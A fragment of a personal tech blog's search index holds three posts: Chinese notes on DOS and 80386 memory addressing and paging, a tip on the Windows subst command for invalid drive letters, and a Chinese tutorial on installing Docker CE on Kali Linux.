id="3-Windwos的内存管理"><a href="#3-Windwos的内存管理" class="headerlink" title="3 Windwos的内存管理"></a>3 Windwos的内存管理</h2><h3 id="3-1-DOS操作系统的内存安排"><a href="#3-1-DOS操作系统的内存安排" class="headerlink" title="3.1 DOS操作系统的内存安排"></a>3.1 DOS操作系统的内存安排</h3><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930151927.png" srcset="/img/loading.gif"></p><ul><li>DOS运行于实模式，存储器的地址被安排在高端，从A0000h（即640KB）开始的384KB中。</li><li>而在内存低端，则安排了中断向量表和BIOS数据区。</li><li>剩余的从500h到A0000h总共不到640KB的内存是操作系统和应用程序所能使用的。**(著名的640KB限制)**</li><li>当80386处理器（32位）推出后，可寻址空间达到了4GB，利用XMS驱动程序可以访问到所有的地址空间。但是16位的段寻址方式限制了DOS程序，<strong>“可见”</strong>的内存范围还是停留在前1MB范围内。所有高于1MB的扩展内存<strong>只能通过XMS驱动程序当作数据交换使用</strong>，程序执行的空间并无增加。</li></ul><p><strong>DOS的寻址方式：</strong></p><ul><li>一个完整的地址分为段地址和偏移地址两部分组成：<ul><li>段地址xxxx存放在16位的段寄存器中</li><li>16位的偏移地址yyyy存放在指令中</li></ul></li><li>计算方法：<strong>real &#x3D; xxxx * 0x10 + yyyy</strong></li></ul><h3 id="3-2-80386的内存寻址机制"><a href="#3-2-80386的内存寻址机制" class="headerlink" title="3.2 80386的内存寻址机制"></a>3.2 80386的内存寻址机制</h3><p><strong>实模式下的内存寻址方式：</strong></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930152012.png" srcset="/img/loading.gif"></p><p><strong>保护模式下GDTR、LDTR、全局描述表、局部描述表和选择器的关系：</strong></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930152046.png" srcset="/img/loading.gif"></p><h3 id="3-3-80386的分页机制"><a href="#3-3-80386的分页机制" class="headerlink" title="3.3 80386的分页机制"></a>3.3 80386的分页机制</h3><p><strong>80386的内存地址转换：</strong></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930152119.png" srcset="/img/loading.gif"></p><p><strong>虚拟内存的实现：</strong></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930152137.png" srcset="/img/loading.gif"></p><h3 id="3-4-Windows的内存安排"><a href="#3-4-Windows的内存安排" class="headerlink" title="3.4 Windows的内存安排"></a>3.4 Windows的内存安排</h3><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930152203.png" srcset="/img/loading.gif"></p><h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4 参考"></a>4 参考</h2><p>[1]《Windows PE 权威指南》</p>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>x86 Assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Invalid Driver Label in Windows</title>
    <link href="/2019/05/16/Invalid-Driver-Label-on-Windows/"/>
    <url>/2019/05/16/Invalid-Driver-Label-on-Windows/</url>
    
    <content type="html"><![CDATA[<p>After we change the label of a disk, the Install control programs in the original driver may be inexecutable, with an error of <strong>“Invalid Driver X:\ “</strong></p><a id="more"></a><h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><h3 id="1-1-Recommended"><a href="#1-1-Recommended" class="headerlink" title="1.1 Recommended"></a>1.1 Recommended</h3><p>Using a DOS-command: <strong>subst</strong> may solve this problem properly.</p><p><strong>subst</strong>: Assign a driver label to a path(a directory) temporarily. Then the directory can be accessed as the Driver.</p><ul><li><p><code>subst [Driver Label] [path to dir]</code>, Create a virtual driver on the &#x2F;path&#x2F;to&#x2F;dir.</p></li><li><p><code>subst [Driver Label] /D</code>, Delete the Created virtual driver.</p></li><li><p><code>subst</code>, list the current Virtual Driver</p></li><li><p>with the help of <strong>subst</strong>, we could also hide the Real Driver like “D: “ by Creating a homonymous Virtual Driver”D: “</p></li></ul><h3 id="1-2-Not-Recommended"><a href="#1-2-Not-Recommended" class="headerlink" title="1.2 Not Recommended"></a>1.2 Not Recommended</h3><p>Modify the Driver Label to the required Label according to the error.</p><p>Be Cautious**!** Remember to <strong>change back</strong> to the original Driver Label, or you will find the other programs in this Disk are inaccessible.</p>]]></content>
    
    
    <categories>
      
      <category>Tricks</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>Virtualization</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali Linux安装Docker</title>
    <link href="/2019/01/12/Kali-Linux%E5%AE%89%E8%A3%85Docker/"/>
    <url>/2019/01/12/Kali-Linux%E5%AE%89%E8%A3%85Docker/</url>
    
    <content type="html"><![CDATA[<p>由于计算机网络课设需求，需要部署多个NS-3的Docker，于是我便尝试在我的Kali上安装Docker。本文将主要介绍其安装过程。</p><a id="more"></a><h2 id="1-卸载旧版本"><a href="#1-卸载旧版本" class="headerlink" title="1 卸载旧版本"></a>1 卸载旧版本</h2><div class="hljs"><pre><code class="hljs bash">sudo apt remove docker docker.io docker-engine</code></pre></div><h2 id="2-使用APT安装"><a href="#2-使用APT安装" class="headerlink" title="2 使用APT安装"></a>2 使用APT安装</h2><h3 id="2-1-安装依赖"><a href="#2-1-安装依赖" class="headerlink" title="2.1 安装依赖"></a>2.1 安装依赖</h3><p>由于APT源使用HTTPS以确保软件下载过程中不被篡改。因此，我们首先需要添加使用HTTPS传输的软件包以及CA证书。</p><div class="hljs"><pre><code class="hljs bash">sudo apt-get updatesudo apt-get install apt-transport ca-certificates curl gnupg2 lsb-release software-properties-common</code></pre></div><h3 id="2-2-添加软件源"><a href="#2-2-添加软件源" class="headerlink" title="2.2 添加软件源"></a>2.2 添加软件源</h3><ul><li>为了确认所下载软件包的合法性，需要添加软件源的GPG密钥</li></ul><div class="hljs"><pre><code class="hljs bash">curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -<span class="hljs-comment"># 官方源</span><span class="hljs-comment"># $ curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -</span></code></pre></div><ul><li>向<code>sources.list</code>添加Docker CE的软件源</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 官方源</span>sudo <span class="hljs-built_in">echo</span> <span class="hljs-string">"deb [arch=amd64] https://download.docker.com/linux/debian stretch stable"</span> | sudo tee -a /etc/apt/sources.list</code></pre></div><h3 id="2-3-安装Docker-CE"><a href="#2-3-安装Docker-CE" class="headerlink" title="2.3 安装Docker CE"></a>2.3 安装Docker CE</h3><p>更新apt软件包缓存，并安装<code>docker-ce</code></p><div class="hljs"><pre><code class="hljs bash">sudo apt-get updatesudo apt-get install docker-ce</code></pre></div><h2 id="3-使用脚本自动安装"><a href="#3-使用脚本自动安装" class="headerlink" title="3 使用脚本自动安装"></a>3 使用脚本自动安装</h2><p> 在测试或开发环境中 Docker 官方为了简化安装流程，提供了一套便捷的安装脚本，Debian 系统上可以使用这套脚本安装，另外可以通过 <code>--mirror</code> 选项使用国内源进行安装： </p><div class="hljs"><pre><code class="hljs bash">curl -fsSL get.docker.com -o get-docker.shsudo sh get-docker.sh --mirror Aliyun<span class="hljs-comment"># sudo sh get-docker.sh --mirror AzureChinaCloud</span></code></pre></div><h2 id="4-建立docker用户组"><a href="#4-建立docker用户组" class="headerlink" title="4 建立docker用户组"></a>4 建立docker用户组</h2><p> 默认情况下，<code>docker</code> 命令会使用 <a href="https://en.wikipedia.org/wiki/Unix_domain_socket" target="_blank" rel="noopener">Unix socket</a> 与 Docker 引擎通讯。而只有 <code>root</code> 用户和 <code>docker</code> 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 <code>root</code> 用户。因此，更好地做法是将需要使用 <code>docker</code> 的用户加入 <code>docker</code> 用户组。 </p><ul><li>建立<code>docker</code>组：</li></ul><div class="hljs"><pre><code class="hljs bash">sudo groupadd docker</code></pre></div><ul><li>将当前用户加入<code>docker</code>组：</li></ul><div class="hljs"><pre><code class="hljs bash">sudo usermod -aG docker <span class="hljs-variable">$USER</span></code></pre></div><p>退出当前终端并重新登录</p>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kali</tag>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
